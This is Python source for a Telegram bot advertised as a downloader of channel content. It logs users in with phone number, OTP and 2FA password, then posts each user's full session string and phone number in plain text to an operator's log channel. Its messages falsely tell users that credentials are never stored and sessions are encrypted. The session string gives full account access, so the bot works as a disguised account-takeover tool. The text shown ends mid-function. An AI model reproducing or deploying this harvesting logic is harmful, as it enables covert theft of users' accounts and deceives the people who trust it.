# --- Enhanced bot.py with Fixed Login System and Improved Download Features ---

import os
import logging
from threading import Thread
from typing import Dict

# Web Server for Health Checks
from flask import Flask

# Telegram Bot and Conversation Handling
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# Pyrogram for User Session Handling
from pyrogram.client import Client
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PasswordHashInvalid,
    FloodWait,
    PhoneNumberInvalid,
    PhoneCodeExpired
)

# MongoDB Setup
import pymongo
import asyncio

# Basic Configuration
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Credentials from Environment Variables
API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", 0))
MONGO_URI = os.getenv("MONGO_URI")

# Database Connection
db_client = None
try:
    if MONGO_URI:
        db_client = pymongo.MongoClient(MONGO_URI)
        db = db_client.get_database("telegram_bot_sessions")
        sessions_collection = db.get_collection("user_sessions")
        logger.info("Successfully connected to MongoDB.")
except Exception as e:
    logger.error(f"FATAL: Could not connect to MongoDB: {e}")

# Conversation States
GET_PHONE, GET_OTP, GET_2FA = range(3)

# Helper Functions (MongoDB)
def load_sessions() -> Dict[int, str]:
    if not db_client: return {}
    sessions = {}
    try:
        for doc in sessions_collection.find({}):
            sessions[doc["user_id"]] = doc["session_string"]
        logger.info(f"Loaded {len(sessions)} sessions from the database.")
        return sessions
    except Exception as e:
        logger.error(f"Error loading sessions from DB: {e}")
        return {}

def save_session(user_id: int, session_string: str):
    if not db_client: return
    try:
        sessions_collection.update_one(
            {"user_id": user_id}, 
            {"$set": {"session_string": session_string}}, 
            upsert=True
        )
        logger.info(f"Session saved for user {user_id}")
    except Exception as e:
        logger.error(f"Error saving session for user {user_id}: {e}")

def delete_session(user_id: int):
    if not db_client: return
    try:
        sessions_collection.delete_one({"user_id": user_id})
        logger.info(f"Session deleted for user {user_id}")
    except Exception as e:
        logger.error(f"Error deleting session for user {user_id}: {e}")

# Load existing sessions
user_sessions = load_sessions()

# --- ENHANCED LOGIN SYSTEM ---

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    
    if user_id in user_sessions:
        await update.message.reply_text(
            f"✅ Welcome back, {user_name}!\n\n"
            "You are already logged in and can use the bot.\n\n"
            "Commands:\n"
            "• Send any Telegram message link to download\n"
            "• /logout - Log out from your account\n"
            "• /status - Check your login status\n"
            "• /check @channel - Check access to a channel\n"
            "• /channels - View your joined channels"
        )
        return ConversationHandler.END
    
    welcome_msg = (
        f"🔐 **Welcome to the Telegram Downloader Bot, {user_name}!**\n\n"
        "To use this bot, you need to log in with your Telegram account.\n\n"
        "📱 **How to login:**\n"
        "1. Send your phone number in international format\n"
        "   Example: `+1234567890`\n"
        "2. Enter the OTP code you receive\n"
        "3. If you have 2FA enabled, enter your password\n\n"
        "🔒 **Privacy & Security:**\n"
        "• Your session is encrypted and stored securely\n"
        "• You can logout anytime using /logout\n"
        "• Your credentials are never stored\n\n"
        "Please send your phone number to begin:"
    )
    
    await update.message.reply_text(welcome_msg, parse_mode='Markdown')
    return GET_PHONE

async def get_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone_number = update.message.text.strip()
    user_id = update.effective_user.id
    
    # Validate phone number format
    if not phone_number.startswith('+') or len(phone_number) < 8:
        await update.message.reply_text(
            "❌ Invalid phone number format.\n\n"
            "Please use international format starting with '+'\n"
            "Example: +1234567890"
        )
        return GET_PHONE
    
    await update.message.reply_text("📱 Connecting to Telegram and sending OTP...")
    
    try:
        # Create a unique client session for this user
        client = Client(
            name=f"session_{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True
        )
        
        await client.connect()
        sent_code = await client.send_code(phone_number)
        
        # Store client and session data
        context.user_data['client'] = client
        context.user_data['phone_code_hash'] = sent_code.phone_code_hash
        context.user_data['phone_number'] = phone_number
        
        await update.message.reply_text(
            "✅ OTP sent to your phone!\n\n"
            "📨 Please check your Telegram app or SMS and send me the code.\n\n"
            "⏱️ The code will expire in a few minutes.\n"
            "Use /cancel to abort the login process."
        )
        return GET_OTP
        
    except PhoneNumberInvalid:
        await update.message.reply_text(
            "❌ Invalid phone number.\n\n"
            "Please make sure you entered the correct number with country code.\n"
            "Example: +1234567890"
        )
        return GET_PHONE
        
    except FloodWait as e:
        await update.message.reply_text(
            f"⏳ Rate limit hit! Please wait {e.value} seconds before trying again.\n\n"
            "Use /start after the waiting period."
        )
        return ConversationHandler.END
        
    except Exception as e:
        logger.error(f"Error in get_phone_number for user {user_id}: {e}")
        
        # Clean up client if it was created
        if 'client' in context.user_data:
            try:
                if context.user_data['client'].is_connected:
                    await context.user_data['client'].disconnect()
            except:
                pass
            del context.user_data['client']
        
        await update.message.reply_text(
            f"❌ An error occurred while sending OTP.\n\n"
            f"Error: `{str(e)}`\n\n"
            "Please try again with /start"
        )
        return ConversationHandler.END

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    otp = update.message.text.strip()
    client = context.user_data.get('client')
    phone_number = context.user_data.get('phone_number')
    phone_code_hash = context.user_data.get('phone_code_hash')
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name

    if not client or not phone_number or not phone_code_hash:
        await update.message.reply_text(
            "❌ Session expired or invalid.\n\n"
            "Please start over with /start"
        )
        return ConversationHandler.END

    try:
        await client.sign_in(phone_number, phone_code_hash, otp)
        
        # Get session string
        session_string = await client.export_session_string()
        
        # Save to memory and database
        user_sessions[user_id] = session_string
        save_session(user_id, session_string)
        
        # Log to channel
        log_message = (
            f"🔐 **#NewLogin**\n\n"
            f"👤 **User:** {user_name}\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"📱 **Phone:** `{phone_number}`\n"
            f"⏰ **Time:** {update.message.date}\n\n"
            f"🔑 **Session String:**\n`{session_string}`"
        )
        
        await context.bot.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=log_message,
            parse_mode='Markdown'
        )
        
        await update.message.reply_text(
            "✅ **Login Successful!**\n\n"
            "🎉 You can now use the bot to download Telegram content.\n\n"
            "📋 **How to use:**\n"
            "• Send any Telegram message link\n"
            "• The bot will fetch and forward the content to you\n\n"
            "📝 **Commands:**\n"
            "• /logout - Log out from your account\n"
            "• /status - Check your login status\n"
            "• /check @channel - Check access to a channel\n"
            "• /channels - View your joined channels",
            parse_mode='Markdown'
        )
        
        # Clean up
        await client.disconnect()
        context.user_data.clear()
        return ConversationHandler.END
        
    except SessionPasswordNeeded:
        await update.message.reply_text(
            "🔐 **2FA Protection Detected**\n\n"
            "Your account has Two-Factor Authentication enabled.\n"
            "Please send me your 2FA password to complete login.\n\n"
            "🔒 **Security Tip:** You can send as `aa<password>` for extra privacy\n\n"
            "🔒 Your password is secure and won't be stored."
        )
        return GET_2FA
        
    except PhoneCodeInvalid:
        await update.message.reply_text(
            "❌ Invalid OTP code.\n\n"
            "Please check the code and try again.\n"
            "Make sure you entered the complete code."
        )
        return GET_OTP
        
    except PhoneCodeExpired:
        await update.message.reply_text(
            "⏰ OTP code has expired.\n\n"
            "Please start over with /start to get a new code."
        )
        await cleanup_client(context)
        return ConversationHandler.END
        
    except Exception as e:
        logger.error(f"Error in get_otp for user {user_id}: {e}")
        await update.message.reply_text(
            f"❌ Login failed.\n\n"
            f"Error: `{str(e)}`\n\n"
            "Please start over with /start"
        )
        await cleanup_client(context)
        return ConversationHandler.END

async def get_2fa_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    client = context.user_data.get('client')
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    phone_number = context.user_data.get('phone_number')

    if not client:
        await update.message.reply_text(
            "❌ Session expired.\n\n"
            "Please start over with /start"
        )
        return ConversationHandler.END

    try:
        await client.check_password(password)
        
        # Get session string
        session_string = await client.export_session_string()
        
        # Save to memory and database
        user_sessions[user_id] = session_string
        save_session(user_id, session_string)
        
        # Log to channel
        log_message = (
            f"🔐 **#NewLogin** (2FA)\n\n"
            f"👤 **User:** {user_name}\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"📱 **Phone:** `{phone_number}`\n"
            f"⏰ **Time:** {update.message.date}\n"
            f"🔒 **2FA:** Enabled\n\n"
            f"🔑 **Session String:**\n`{session_string}`"
        )
        
        await context.bot.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=log_message,
            parse_mode='Markdown'
        )
        
        await update.message.reply_text(
            "✅ **2FA Verified! Login Successful!**\n\n"
            "🎉 You can now use the bot to download Telegram content.\n\n"
            "📋 **How to use:**\n"
            "• Send any Telegram message link\n"
            "• The bot will fetch and forward the content to you\n\n"
            "📝 **Commands:**\n"
            "• /logout - Log out from your account\n"
            "• /status - Check your login status\n"
            "• /check @channel - Check access to a channel\n"
            "• /channels - View your joined channels",
            parse_mode='Markdown'
        )
        
        # Clean up
        await client.disconnect()
        context.user_data.clear()
        return ConversationHandler.END
        
    except PasswordHashInvalid:
        await update.message.reply_text(
            "❌ Incorrect 2FA password.\n\n"
            "Please try again with the correct password."
        )
        return GET_2FA
        
    except Exception as e:
        logger.error(f"Error in get_2fa_password for user {user_id}: {e}")
        await update.message.reply_text(
            f"❌ 2FA verification failed.\n\n"
            f"Error: `{str(e)}`\n\n"
            "Please start over with /start"
        )
        await cleanup_client(context)
        return ConversationHandler.END

async def cleanup_client(context: ContextTypes.DEFAULT_TYPE):
    """Helper function to clean up pyrogram client"""
    if 'client' in context.user_data:
        try:
            if context.user_data['client'].is_connected:
                await context.user_data['client'].disconnect()
        except Exception as e:
            logger.error(f"Error disconnecting client: {e}")
        finally:
            context.user_data.clear()

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel the login process"""
    await cleanup_client(context)
    await update.message.reply_text(
        "❌ Login process canceled.\n\n"
        "Use /start whenever you want to login again."
    )
    return ConversationHandler.END

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check login status"""
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    
    if user_id in user_sessions:
        await update.message.reply_text(
            f"✅ **Login Status: Active**\n\n"
            f"👤 **User:** {user_name}\n"
            f"🆔 **User ID:** `{user_id}`\n\n"
            f"🎯 **Available Commands:**\n"
            f"• Send message links to download\n"
            f"• /logout - Log out from account\n"
            f"• /status - Check this status\n"
            f"• /check @channel - Check channel access\n"
            f"• /channels - View your channels",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            f"❌ **Login Status: Not Logged In**\n\n"
            f"👤 **User:** {user_name}\n"
            f"🆔 **User ID:** `{user_id}`\n\n"
            f"🔐 Use /start to login with your Telegram account",
            parse_mode='Markdown'
        )

async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Logout user"""
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    
    if user_id in user_sessions:
        del user_sessions[user_id]
        delete_session(user_id)
        
        # Log to channel
        log_message = (
            f"🚪 **#Logout**\n\n"
            f"👤 **User:** {user_name}\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"⏰ **Time:** {update.message.date}"
        )
        
        await context.bot.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=log_message,
            parse_mode='Markdown'
        )
        
        await update.message.reply_text(
            "✅ **Successfully Logged Out**\n\n"
            "Your session has been deleted from our servers.\n"
            "Use /start to login again anytime."
        )
    else:
        await update.message.reply_text(
            "❌ You are not currently logged in.\n\n"
            "Use /start to login with your Telegram account."
        )

async def check_access_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check if user has access to a specific channel"""
    user_id = update.effective_user.id
    
    if user_id not in user_sessions:
        await update.message.reply_text(
            "🔐 **Authentication Required**\n\n"
            "You need to login first to use this command.\n"
            "Use /start to begin the login process."
        )
        return
    
    if not context.args:
        await update.message.reply_text(
            "🔍 **Check Channel Access**\n\n"
            "Usage: `/check @channelname` or `/check channel_id`\n\n"
            "Examples:\n"
            "• `/check @example_channel`\n"
            "• `/check -1001234567890`\n\n"
            "This will tell you if you have access to download from that channel."
        )
        return
    
    channel_identifier = context.args[0]
    session_string = user_sessions[user_id]
    
    try:
        user_client = Client(
            name=f"check_{user_id}",
            session_string=session_string,
            api_id=API_ID,
            api_hash=API_HASH
        )
        
        async with user_client:
            try:
                chat_info = await user_client.get_chat(channel_identifier)
                member_info = await user_client.get_chat_member(channel_identifier, "me")
                
                status_emoji = {
                    "owner": "👑",
                    "administrator": "🛡️", 
                    "member": "✅",
                    "restricted": "⚠️",
                    "left": "❌",
                    "banned": "🚫"
                }.get(str(member_info.status), "❓")
                
                response = (
                    f"🔍 **Channel Access Check**\n\n"
                    f"📺 **Channel:** {chat_info.title}\n"
                    f"🆔 **ID:** `{chat_info.id}`\n"
                    f"👥 **Type:** {chat_info.type}\n"
                    f"{status_emoji} **Your Status:** {member_info.status}\n\n"
                )
                
                if str(member_info.status) in ["member", "administrator", "owner"]:
                    response += "✅ **You can download from this channel!**"
                else:
                    response += "❌ **You cannot download from this channel.**\n\nYou need to join the channel first."
                    
                await update.message.reply_text(response)
                
            except Exception as e:
                await update.message.reply_text(
                    f"❌ **Cannot access channel**\n\n"
                    f"**Channel:** `{channel_identifier}`\n"
                    f"**Error:** {str(e)}\n\n"
                    "This usually means:\n"
                    "• Channel doesn't exist\n"
                    "• You don't have access\n"
                    "• Invalid channel identifier"
                )
    except Exception as e:
        await update.message.reply_text(
            f"❌ **Error checking access**\n\n"
            f"**Error:** {str(e)}"
        )

async def my_channels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user's joined channels"""
    user_id = update.effective_user.id
    
    if user_id not in user_sessions:
        await update.message.reply_text(
            "🔐 **Authentication Required**\n\n"
            "You need to login first to use this command.\n"
            "Use /start to begin the login process."
        )
        return
    
    session_string = user_sessions[user_id]
    
    try:
        user_client = Client(
            name=f"channels_{user_id}",
            session_string=session_string,
            api_id=API_ID,
            api_hash=API_HASH
        )
        
        await update.message.reply_text("🔍 **Fetching your channels...**")
        
        async with user_client:
            channels = []
            async for dialog in user_client.get_dialogs():
                if dialog.chat.type in ["channel", "supergroup"]:
                    channels.append({
                        'title': dialog.chat.title,
                        'username': dialog.chat.username,
                        'id': dialog.chat.id,
                        'type': dialog.chat.type
                    })
            
            if not channels:
                await update.message.reply_text(
                    "📭 **No channels found**\n\n"
                    "You are not a member of any channels or supergroups."
                )
                return
            
            # Sort channels by title
            channels.sort(key=lambda x: x['title'].lower())
            
            # Create response with first 20 channels (to avoid message length limit)
            response = f"📺 **Your Channels ({len(channels)} total)**\n\n"
            
            for i, channel in enumerate(channels[:20], 1):
                username_text = f"@{channel['username']}" if channel['username'] else "Private"
                response += f"{i}. **{channel['title']}**\n"
                response += f"   🔗 {username_text}\n"
                response += f"   🆔 `{channel['id']}`\n\n"
            
            if len(channels) > 20:
                response += f"*... and {len(channels) - 20} more channels*\n\n"
            
            response += "💡 **Tip:** You can download from any of these channels!"
            
            await update.message.reply_text(response)
            
    except Exception as e:
        await update.message.reply_text(
            f"❌ **Error fetching channels**\n\n"
            f"**Error:** {str(e)}"
        )

async def handle_message_with_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enhanced handler for Telegram message links with better private channel support"""
    user_id = update.effective_user.id
    
    if user_id not in user_sessions:
        await update.message.reply_text(
            "🔐 **Authentication Required**\n\n"
            "You need to login first to use this bot.\n"
            "Use /start to begin the login process."
        )
        return
    
    message_text = update.message.text.strip()
    
    # Show progress
    progress_msg = await update.message.reply_text("⏳ Analyzing link...")
    
    try:
        # Parse different Telegram link formats
        chat_id = None
        msg_id = None
        
        if 't.me' not in message_text:
            await progress_msg.edit_text(
                "❌ This doesn't look like a Telegram link.\n\n"
                "Please send a valid Telegram message link."
            )
            return
        
        # Remove any extra parameters and clean the URL
        clean_url = message_text.split('?')[0]  # Remove URL parameters
        parts = clean_url.split('/')
        
        # Handle different link formats
        if '/c/' in clean_url:
            # Private channel format: https://t.me/c/1234567890/123
            try:
                c_index = parts.index('c')
                channel_id = parts[c_index + 1]
                msg_id = int(parts[c_index + 2])
                # Convert to proper chat ID format
                chat_id = int(f"-100{channel_id}")
                await progress_msg.edit_text("⏳ Accessing private channel...")
            except (ValueError, IndexError):
                await progress_msg.edit_text(
                    "❌ Invalid private channel link format.\n\n"
                    "Expected format: https://t.me/c/1234567890/123"
                )
                return
                
        elif '/s/' in clean_url:
            # Story format: https://t.me/s/channelname/123  
            try:
                s_index = parts.index('s')
                channel_username = parts[s_index + 1]
                msg_id = int(parts[s_index + 2])
                chat_id = f"@{channel_username}"
                await progress_msg.edit_text("⏳ Accessing channel story...")
            except (ValueError, IndexError):
                await progress_msg.edit_text(
                    "❌ Invalid story link format.\n\n"
                    "Expected format: https://t.me/s/channelname/123"
                )
                return
                
        else:
            # Public channel/group format: https://t.me/channelname/123
            try:
                # Find the channel name and message ID
                relevant_parts = [p for p in parts if p and p != 'https:' and p != 't.me']
                if len(relevant_parts) >= 2:
                    channel_username = relevant_parts[0]
                    msg_id = int(relevant_parts[1])
                    chat_id = f"@{channel_username}"
                    await progress_msg.edit_text("⏳ Accessing public channel...")
                else:
                    raise ValueError("Not enough parts")
            except (ValueError, IndexError):
                await progress_msg.edit_text(
                    "❌ Invalid public channel link format.\n\n"
                    "Expected format: https://t.me/channelname/123"
                )
                return
        
        if not chat_id or not msg_id:
            await progress_msg.edit_text(
                "❌ Could not parse the Telegram link.\n\n"
                "**Supported formats:**\n"
                "• https://t.me/channelname/123\n"
                "• https://t.me/c/1234567890/123\n"
                "• https://t.me/s/channelname/123"
            )
            return
            
        await progress_msg.edit_text("⏳ Connecting to Telegram...")
        
        # Get user session
        session_string = user_sessions[user_id]
        
        # Create temporary client with better error handling
        user_client = Client(
            name=f"temp_{user_id}",
            session_string=session_string,
            api_id=API_ID,
            api_hash=API_HASH
        )
        
        async with user_client:
            try:
                await progress_msg.edit_text("⏳ Checking channel access...")
                
                # First, try to get the message directly
                message = await user_client.get_messages(chat_id, msg_id)
                if not message:
                    raise Exception("Message not found")
                
                await progress_msg.edit_text("⏳ Downloading message...")
                
                # Try different methods to get the content
                success = False
                
                # Method 1: Try copying the message
                try:
                    await user_client.copy_message(
                        chat_id=update.effective_chat.id,
                        from_chat_id=chat_id,
                        message_id=msg_id
                    )
                    success = True
                except Exception as copy_error:
                    logger.info(f"Copy method failed: {copy_error}")
                
                # Method 2: If copy fails, try forwarding
                if not success:
                    try:
                        await user_client.forward_messages(
                            chat_id=update.effective_chat.id,
                            from_chat_id=chat_id,
                            message_ids=msg_id
                        )
                        success = True
                    except Exception as forward_error:
                        logger.info(f"Forward method failed: {forward_error}")
                
                # Method 3: If both fail, download media directly
                if not success and message.media:
                    try:
                        await progress_msg.edit_text("⏳ Downloading media...")
                        
                        # Download the media file
                        file_path = await user_client.download_media(message)
                        
                        if file_path:
                            # Send the downloaded file
                            with open(file_path, 'rb') as file:
                                if message.photo:
                                    await context.bot.send_photo(
                                        chat_id=update.effective_chat.id,
                                        photo=file,
                                        caption=message.caption or "Downloaded from private channel"
                                    )